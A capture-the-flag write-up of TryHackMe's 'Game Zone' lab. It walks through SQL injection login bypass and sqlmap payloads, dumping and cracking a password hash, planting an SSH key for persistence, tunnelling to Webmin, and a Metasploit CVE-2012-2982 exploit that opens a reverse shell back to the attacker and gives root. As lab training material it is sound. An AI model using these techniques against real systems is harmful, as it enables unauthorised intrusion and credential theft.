# [Game Zone](https://tryhackme.com/room/gamezone)

Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

## Deploy the machine and access its web server.

```bash
$ nmap -A -sC -T4 10.10.175.24

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-31 17:03 GMT
Nmap scan report for 10.10.175.24
Host is up (0.027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.03 seconds
```

The application is vulnerable to SQL Injection.
We were able to login to the admin using 

login: `a' or 1=1 -- ##`
password: `a' or 1=1 -- ##`

Which redirects us to the `http://10.10.175.24/portal.php`

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.175.24' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 12' -H $'Origin: http://10.10.175.24' -H $'DNT: 1' -H $'Connection: close' -H $'Referer: http://10.10.175.24/portal.php' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-GPC: 1' \
    -b $'PHPSESSID=78517qmp5u7a5e38qqadk438e2' \
    --data-binary $'searchitem=a' \
    $'http://10.10.175.24/portal.php'

```

## SQLmap

### Request 

Here is the capture of the request done with Burp Proxy

```bash
$ cat request.txt 
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="2020.12.1" exportTime="Fri Jan 01 13:26:50 GMT 2021">
  <item>
    <time>Fri Jan 01 13:22:00 GMT 2021</time>
    <url><![CDATA[http://10.10.175.24/portal.php]]></url>
    <host ip="10.10.175.24">10.10.175.24</host>
    <port>80</port>
    <protocol>http</protocol>
    <method><![CDATA[POST]]></method>
    <path><![CDATA[/portal.php]]></path>
    <extension>php</extension>
    <request base64="true"><![CDATA[UE9TVCAvcG9ydGFsLnBocCBIVFRQLzEuMQ0KSG9zdDogMTAuMTAuMTc1LjI0DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2Ojc4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNzguMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEyDQpPcmlnaW46IGh0dHA6Ly8xMC4xMC4xNzUuMjQNCkROVDogMQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly8xMC4xMC4xNzUuMjQvcG9ydGFsLnBocA0KQ29va2llOiBQSFBTRVNTSUQ9Nzg1MTdxbXA1dTdhNWUzOHFxYWRrNDM4ZTINClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1HUEM6IDENCg0Kc2VhcmNoaXRlbT1h]]></request>
    <status></status>
    <responselength></responselength>
    <mimetype></mimetype>
    <response base64="true"></response>
    <comment></comment>
  </item>
</items>
```

### SQL Injection 

```bash
$ sqlmap -r request.txt --dbms=mysql --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.11#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:29:51 /2021-01-01/

[13:29:51] [INFO] parsing HTTP request from 'request.txt'
[13:29:51] [INFO] testing connection to the target URL
[13:29:51] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:29:51] [INFO] testing if the target URL content is stable
[13:29:51] [INFO] target URL content is stable
[13:29:51] [INFO] testing if POST parameter 'searchitem' is dynamic
[13:29:51] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
[13:29:51] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
[13:29:51] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
[13:29:51] [INFO] testing for SQL injection on POST parameter 'searchitem'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[13:29:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:29:56] [WARNING] reflective value(s) found and filtering out
[13:29:57] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:29:57] [INFO] testing 'Generic inline queries'
[13:29:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:29:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:29:59] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="11")
[13:29:59] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:29:59] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:29:59] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:29:59] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:29:59] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[13:29:59] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[13:29:59] [INFO] testing 'MySQL inline queries'
[13:29:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:29:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:29:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:29:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:29:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[13:29:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[13:29:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:30:09] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:30:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:30:09] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[13:30:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:30:09] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:30:10] [INFO] target URL appears to have 3 columns in query
[13:30:10] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[13:30:10] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=-8031' OR 5092=5092#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=a' AND GTID_SUBSET(CONCAT(0x71627a6271,(SELECT (ELT(3240=3240,1))),0x716a627871),3240)-- WcSi

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=a' AND (SELECT 7060 FROM (SELECT(SLEEP(5)))QHiP)-- YXCU

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchitem=a' UNION ALL SELECT NULL,NULL,CONCAT(0x71627a6271,0x615a794d4a765452676150446e6c7552634f5a527473675463514b655a56766459485063704f546b,0x716a627871)#
---
[13:32:53] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[13:32:53] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[13:32:53] [INFO] fetching current database
[13:32:53] [INFO] fetching tables for database: 'db'
[13:32:53] [INFO] fetching columns for table 'post' in database 'db'
[13:32:53] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[13:32:53] [INFO] table 'db.post' dumped to CSV file '/home/clobee/.local/share/sqlmap/output/10.10.175.24/dump/db/post.csv'
[13:32:53] [INFO] fetching columns for table 'users' in database 'db'
[13:32:53] [INFO] fetching entries for table 'users' in database 'db'
[13:32:53] [INFO] recognized possible password hashes in column 'pwd'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[13:33:03] [INFO] writing hashes to a temporary file '/tmp/sqlmapvfmuqxb33625/sqlmaphashes-w11rfvd_.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[13:33:11] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[13:33:15] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[13:33:21] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[13:33:21] [INFO] starting 4 processes 
[13:33:34] [WARNING] no clear password(s) found                                                                                                                                                                                              
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[13:33:34] [INFO] table 'db.users' dumped to CSV file '/home/clobee/.local/share/sqlmap/output/10.10.175.24/dump/db/users.csv'
[13:33:34] [INFO] fetched data logged to text files under '/home/clobee/.local/share/sqlmap/output/10.10.175.24'

[*] ending @ 13:33:34 /2021-01-01/
```

Thanks to this we now have a password we can crack 

### Password cracking

```bash
clobee@kali:~/tmp/gamezone$ hashcat --help | grep SHA2-256
   1400 | SHA2-256                                         | Raw Hash
```

```bash
clobee@kali:~/tmp/gamezone$ hashcat -m 1400 ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-5257U CPU @ 2.70GHz, 5821/5885 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344356
* Bytes.....: 139921262
* Keyspace..: 14344356

ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14:videogamer124
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA2-256
Hash.Target......: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218...3efd14
Time.Started.....: Fri Jan  1 13:45:02 2021 (1 sec)
Time.Estimated...: Fri Jan  1 13:45:03 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2863.4 kH/s (0.83ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2891776/14344356 (20.16%)
Rejected.........: 0/2891776 (0.00%)
Restore.Point....: 2887680/14344356 (20.13%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: vikenceto -> vida6

Started: Fri Jan  1 13:44:59 2021
Stopped: Fri Jan  1 13:45:04 2021
```

We now have the password of Agent47

```bash
clobee@kali:~/tmp/gamezone$ hashcat -m 1400 ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 /usr/share/wordlists/rockyou.txt --show
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14:videogamer124
```

```bash
$ sshpass -p 'videogamer124' ssh agent47@10.10.175.24
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ 
```

### Maintaining Access: Persistence

I created a key on my machine

```bash
$ ssh-keygen

Generating public/private rsa key pair.
Enter file in which to save the key (/home/clobee/.ssh/id_rsa): tryhackme
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in tryhackme
Your public key has been saved in tryhackme.pub
The key fingerprint is:
SHA256:5jKx/4Rg3iLhgXG+WZ5SM535UL6ZsygQG9HnVznhm9w clobee@kali
The key's randomart image is:
+---[RSA 3072]----+
|     .      .o   |
|    . . .  .+    |
|  . .. o  ....   |
|   =o  ..=.. +   |
|  . ++O S.. + E  |
|   .o@ @ + +     |
|    *.O + B      |
|     o.= o o     |
|       .o.o      |
+----[SHA256]-----+
$ chmod 600 tryhackme

$ cat tryhackme.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOa1AOXzy8E1Y9bbE9IoxHSdskeN1S38hEjOuoShn9SlSWlWsKxKObMjKs7dmzxi3B+VPiJ9FqUc+ZC6JJpoDz7jCdsTnKsLCV3vGeg8BK7stp1MUd+bBuPsCHjsUzbQRLVpiC/KtOhcOAvC/kvKX/c5/inXMJowdKj5ElYXpOaAOz5H7U3sE9coqsfTD8DiDtwapXjyvYRFy2gRreUB4Z9bsM74LXN7LKXt9AWcfcNi7JzFOTPlAcYLxw1yRKAu9nhOW1/8Wj7qQEFIRTyYq73v0kY3VBPZwV09JCaX2GGe2/1jtDfG/qHtw79D5MqtRxDCuTtYNmwDI2MV8Oa0Brz2S9OIIHjzzA+8qUcBCggIq86zwreQutuAKxdrEFU5tk5/nttia9K9JZhU9Vn/8+FGLK0kFv/TXg5kAahYN3jC4RYnN6ZYYVNH9P7KJUZizJj5993NdAUeWHTTzeEEmZDJgbZ5I/IcDQJkUixAAWlhFGQqdoENs4/Uk8m2pVkGk= clobee@kali
```

And added it on the victim user apaar authorize_keys

```bash
agent47@gamezone:~$ mkdir .ssh

agent47@gamezone:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOa1AOXzy8E1Y9bbE9IoxHSdskeN1S38hEjOuoShn9SlSWlWsKxKObMjKs7dmzxi3B+VPiJ9FqUc+ZC6JJpoDz7jCdsTnKsLCV3vGeg8BK7stp1MUd+bBuPsCHjsUzbQRLVpiC/KtOhcOAvC/kvKX/c5/inXMJowdKj5ElYXpOaAOz5H7U3sE9coqsfTD8DiDtwapXjyvYRFy2gRreUB4Z9bsM74LXN7LKXt9AWcfcNi7JzFOTPlAcYLxw1yRKAu9nhOW1/8Wj7qQEFIRTyYq73v0kY3VBPZwV09JCaX2GGe2/1jtDfG/qHtw79D5MqtRxDCuTtYNmwDI2MV8Oa0Brz2S9OIIHjzzA+8qUcBCggIq86zwreQutuAKxdrEFU5tk5/nttia9K9JZhU9Vn/8+FGLK0kFv/TXg5kAahYN3jC4RYnN6ZYYVNH9P7KJUZizJj5993NdAUeWHTTzeEEmZDJgbZ5I/IcDQJkUixAAWlhFGQqdoENs4/Uk8m2pVkGk= clobee@kali
" >> /home/agent47/.ssh/authorized_keys

```

Which gave me a proper entry point on the victim machine (no need to run the reverse shell anymore)

```bash
$ sshpass -p 'videogamer124' ssh -i ~/ssh/tryhackme agent47@10.10.175.24

Warning: Identity file /home/clobee/ssh/tryhackme not accessible: No such file or directory.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Jan  1 07:54:45 2021 from 10.11.21.99
agent47@gamezone:~$ 
```


## Pivilege escalation: agent47 -> root

I did some researchs but didn't find anything significant.

I noticed an application on `/var/www/files` with the root password of Mysql.

This finding drove to list the ports open on the server and noticed the application on port 10000.


```bash
$ ss -tunlp

Netid State      Recv-Q Send-Q              Local Address:Port                             Peer Address:Port              
udp   UNCONN     0      0                               *:10000                                       *:*                  
udp   UNCONN     0      0                               *:68                                          *:*                  
tcp   LISTEN     0      80                      127.0.0.1:3306                                        *:*                  
tcp   LISTEN     0      128                             *:10000                                       *:*                  
tcp   LISTEN     0      128                             *:22                                          *:*                  
tcp   LISTEN     0      128                            :::80                                         :::*                  
tcp   LISTEN     0      128                            :::22                                         :::*                  
agent47@gamezone:~$ 
```

I then created a tunnel on my machine to the port 10000 on the victim server.

```bash
ssh -L 10000:localhost:10000 agent47@10.10.175.24
```

The application on port 10000 was webmin 1.580

```bash
$ nmap -sC -sV -A 127.0.0.1 -p 10000

Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-01 21:48 GMT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000069s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.580 (Webmin httpd)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Login to Webmin

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.65 seconds
```

```bash
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > search CVE-2012-2982

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec  2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/webmin_show_cgi_exec

msf6 exploit(unix/webapp/webmin_show_cgi_exec) > use 0

msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse

msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  videogamer124    yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     10000            yes       The target port (TCP)
   SSL       false            yes       Use SSL
   USERNAME  agent47          yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580


msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set LHOST 10.11.21.99
LHOST => 10.11.21.99

msf6 exploit(unix/webapp/webmin_show_cgi_exec) > exploit

[*] Started reverse TCP double handler on 10.11.21.99:4444 
[*] Attempting to login...
[+] Authentication successfully
[+] Authentication successfully
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo dIiRO7qYbHAgIKbR;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "dIiRO7qYbHAgIKbR\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.11.21.99:4444 -> 10.10.219.175:44466) at 2021-01-01 22:07:01 +0000

id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```